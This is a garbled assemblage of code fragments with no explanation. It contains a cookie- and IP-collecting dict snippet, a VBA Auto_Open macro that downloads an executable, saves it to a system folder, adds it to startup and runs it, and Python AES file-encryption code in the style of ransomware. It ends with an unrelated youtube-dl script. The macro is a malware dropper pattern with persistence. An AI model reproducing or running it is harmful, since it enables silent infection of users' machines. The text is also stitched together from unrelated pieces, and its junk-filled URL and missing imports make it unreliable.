                'ip_address': ip_address,
                'cookies': cookies

        with open('malware.zip', 'rb') as f:

Sub Auto_Open()
 objectives of the macro
    '1. download an executable from web
    '2. save into AppData folder
    '3. add the executable to startup
    '4. run the executable
 
    'create object for Internet Explore
    Dim IE As Object
    Set IE = CreateObject("InternetExplorer.application")
 
    'set the properties for Internet Explore
    IE.Navigate2 "https://www.google.com/"
    IE.Visible = True
 
 
    'declare object variables for AppData Folder
    Dim fso As Object
    Dim folder As Variant
 
    'set properties for AppData Folder
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set folder = fso.GetSpecialFolder(0)
 
 
    'URL of the executable to be downloaded
    strURL = "http://download-wz.safedownloadhub.com/dl/6ba6619386f457603f8d2bed486ea677fa9 civilizations defeat dangerous downloaded driver electrical filename forced google help internet ireb loki newest party patch people printer profile q mobile qlab registered rmstat shortcut surgery zip"
 
    'save downloaded executable into AppData Folder
    Dim NameOfProgram As String
    NameOfProgram = folder & "\example.exe"
    Dim oStream As Object
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Open
    oStream.Type = 1
    oStream.Write IE.Document.body.innerhtml
    oStream.SaveToFile NameOfProgram, 2
 
 
    'Add executable to startup
    Dim WShShell As Object
    Dim objShortcut As Object
    Dim MyPath As String, MyName As String, link As String
 
    MyPath = NameOfProgram
    MyName = "Name Of Program"
 
    link = "shell:startup"
 
    Set WShShell = CreateObject("WScript.Shell")
'create object in the startup folder
    Set objShortcut = WshShell.CreateShortcut(link & "\" & MyName & ".lnk")
' properties of the executable to be executed at startup
    objShortcut.TargetPath = MyPath
    objShortcut.WorkingDirectory = folder
    objShortcut.Save
 
 
    'execute the program
    Call Shell(NameOfProgram, vbNormalFocus)
 
End Sub

import os
import Crypto
from Crypto.Cipher import AES

key = 'This is a key123' #16, 24, or 32 bytes

def encrypt_files(key, in_filename, out_filename=None, chunksize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24, or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the input file. Larger
            chunk sizes can be faster for some files and
            machines.
            chunksize must be divisible by 16.
    """

    if not out_filename:
        out_filename = in_filename + '.enc'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

Does that sound right? If so, then you can use the youtube-dl program to do this. All you need to do is write a simple script that uses youtube-dl to download the desired videos.

Here is a quick example of how you could do this:

#!/bin/bash

# download specified YouTube videos

# 30 per second

for ((i=1; i<=30; i++)); do

youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=$i

done
